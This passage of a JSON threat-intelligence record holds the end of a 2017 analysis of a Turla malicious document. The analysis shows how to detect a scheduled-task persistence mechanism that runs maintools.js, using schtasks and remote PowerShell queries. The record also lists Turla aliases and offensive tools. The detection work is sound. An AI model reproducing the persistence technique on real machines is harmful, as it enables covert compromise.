c:\\Users\\user1\\AppData\\Local\\Microsoft\\Windows\\maintools.js EzZETcSXyKAdF_e5I2i1.\n With the Schedule Task tool from Windows, it is possible to spot it\n\n\n-----\n\n## A way to check it via the CMD line is dumping all the schedule tasks and exporting to a file. For example, with a command like this:\n schtasks /query /fo csv /v > output.csv\n Which permits to see the full schedule task:\n \"PC-DEV\",\"\\WPD\\TaskManager\",\"N/A\",\"Ready\",\"Interactive only\",\"N/A\",\"1\",\"user1\",\"c:\\Users\\user1\\AppData\\Local\\Microsoft\\Windows\\maintools.js EzZETcSXyKAdF_e5I2i1\",\"c:\\Users\\user1\\AppData\\Local\\Microsoft\\Windows\\\",\"Windows Task Manager\",\"Enabled\",\"Disabled\",\"Stop On Battery Mode, No Start On Batteries\",\"user1\",\"Enabled\",\"72:00:00\",\"Scheduling data is not available in this format.\",\"At logon time\",\"N/A\",\"N/A\",\"N/A\",\"N/A\",\"N/A\",\"N/A\",\"N/A\",\"N/A\",\"N/A\"\n In a corporate environment, it is possible to search for that artifact via a query with PowerShell. For example, something like this would make the work:\n Invoke-Command -ComputerName COMPUTERNAME -ScriptBlock {schtasks /query /fo csv /v | findstr /i maintools} -credential USER\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-10-05 - Analysis of a malicious DOC used by Turla APT group; hunting persistence via PowerShell.pdf"
    ],
    "report_names": [
        "2017-10-05 - Analysis of a malicious DOC used by Turla APT group; hunting persistence via PowerShell.pdf"
    ],
    "threat_actors": [
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1675303644,
    "ts_updated_at": 1743041780,
    "ts_creation_date": 1675238112,
    "ts_modification_date": 1675238112,
    "files": {
        "pdf": "https://archive.orkl.eu/287efc1026a2c7c86d4a84a2cd38966e1c56967d.pdf",
        "text": "https://archive.orkl.eu/287efc1026a2c7c86d4a84a2cd38966e1c56967d.txt",
        "img": "https://archive.orkl.eu/287efc1026a2c7c86d4a84a2cd38966e1c56967d.jpg"
    }
}